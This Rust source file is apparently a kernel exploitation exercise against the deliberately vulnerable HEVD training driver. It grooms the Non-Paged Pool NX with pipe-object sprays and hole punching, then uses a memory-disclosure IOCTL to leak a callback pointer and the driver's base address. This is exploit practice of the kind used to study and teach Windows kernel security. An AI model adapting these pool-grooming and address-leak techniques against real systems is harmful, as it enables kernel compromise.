use std::{
    ffi::c_void,
    ptr::{null, null_mut},
};

use win_kexp::{
    pool::AnonymousPipe,
    win32k::{
        close_handle, get_device_handle, io_device_control, FILE_ANY_ACCESS, FILE_DEVICE_UNKNOWN,
        HANDLE, METHOD_NEITHER,
    },
    CTL_CODE, IOCTL,
};

const HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX: u32 = IOCTL!(0x813);
const HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX: u32 = IOCTL!(0x814);

fn allocate_uaf_object_non_paged_pool_nx(h_device: HANDLE) -> u32 {
    io_device_control(
        h_device,
        HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX,
        null(),
        0,
        null_mut(),
        0,
    )
}

fn main() {
    let device_path = r"\\.\HackSysExtremeVulnerableDriver\0";

    println!("[+] Getting device handle {device_path}...");

    let h_device = get_device_handle(device_path);

    println!("[+] Successfully opened device handle.");

    println!("[+] Normalising Non-Paged Pool NX with UAF object...");
    for _ in 0..0x80 {
        allocate_uaf_object_non_paged_pool_nx(h_device);
    }

    println!("[+] Spraying Non-Paged Pool NX with NamedPipe object...");
    let mut pipe_objects = Vec::new();
    for _ in 0..0x800 {
        let buffer_size = 0x70 - 0x48;
        let pipe_object = AnonymousPipe::new(buffer_size);
        let data = vec![0x41; buffer_size as usize];
        pipe_object.write(&data);
        pipe_objects.push(Some(pipe_object));
    }

    println!("[+] Creating holes in Non-Paged Pool NX with NamedPipe object...");
    for i in (1..pipe_objects.len()).step_by(2) {
        if let Some(pipe) = pipe_objects[i].take() {
            drop(pipe);
        }
        pipe_objects[i] = None;
    }

    println!("[+] Filling holes in Non-Paged Pool NX with UAF object...");
    for _ in 0..0x800 {
        allocate_uaf_object_non_paged_pool_nx(h_device);
    }

    println!("[+] Removing remaining NamedPipe objects in Non-Paged Pool NX...");
    for pipe_object in pipe_objects.into_iter().flatten() {
        drop(pipe_object);
    }

    println!("[+] Triggering memory disclosure...");
    let mut count = 0;
    let mut found = false;
    while count < 100 && !found {
        let mut buffer = vec![0; 0x700];
        io_device_control(
            h_device,
            HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX,
            null(),
            0,
            buffer.as_mut_ptr() as *mut c_void,
            0x100,
        );

        let mut pointers = Vec::new();
        for chunk in buffer.chunks(8) {
            if chunk.len() == 8 {
                let ptr = u64::from_le_bytes(chunk.try_into().unwrap());
                if ptr != 0 {
                    pointers.push(ptr);
                }
            }
        }

        for i in 0..pointers.len() {
            if (pointers[i] & 0xFFFFFFFF00000000) == 0x6b63614800000000
                && i < pointers.len() - 2
                && (pointers[i + 2] & 0xFFFFF00000000000) == 0xFFFFF00000000000
            {
                println!(
                    "\t[*] Leaked HEVD!UaFObjectCallback: {:#x}",
                    pointers[i + 2]
                );
                println!(
                    "\t[*] Leaked HEVD base address: {:#x}",
                    pointers[i + 2] - 0x880E8
                );
                found = true;
                break;
            }
        }

        if found {
            break;
        }

        count += 1;
    }

    if !found {
        println!("[-] Failed to leak pointer.");
        return;
    }

    close_handle(h_device);

    println!("[+] Successfully closed device handle.");
}
